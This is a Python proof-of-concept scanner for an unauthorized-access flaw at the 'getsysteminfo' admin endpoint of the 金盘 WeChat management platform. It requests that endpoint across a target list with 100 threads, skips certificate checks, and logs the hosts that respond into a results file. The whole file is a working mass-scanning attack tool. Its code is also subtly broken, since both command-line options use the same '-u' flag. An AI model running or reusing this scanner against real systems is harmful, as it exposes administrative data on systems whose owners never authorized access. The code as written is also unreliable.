import requests, sys, argparse, json, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

                        ██╗██╗███╗   ██╗██████╗  █████╗ ███╗   ██╗
                         ██║██║████╗  ██║██╔══██╗██╔══██╗████╗  ██║
                         ██║██║██╔██╗ ██║██████╔╝███████║██╔██╗ ██║
                    ██   ██║██║██║╚██╗██║██╔═══╝ ██╔══██║██║╚██╗██║
                    ╚█████╔╝██║██║ ╚████║██║     ██║  ██║██║ ╚████║
                     ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                    author:秋妤
                                                                    date:2024.09.25
                                                                    version:1.0
"""
    print(test)


def poc(target):
    payload = "/admin/weichatcfg/getsysteminfo"
    try:
        res = requests.get(url=target + payload, verify=False)
        if res.status_code == 200 and 'id' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('金盘_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 金盘 微信管理平台 getsysteminfo 未授权访问漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == "__main__":
    main()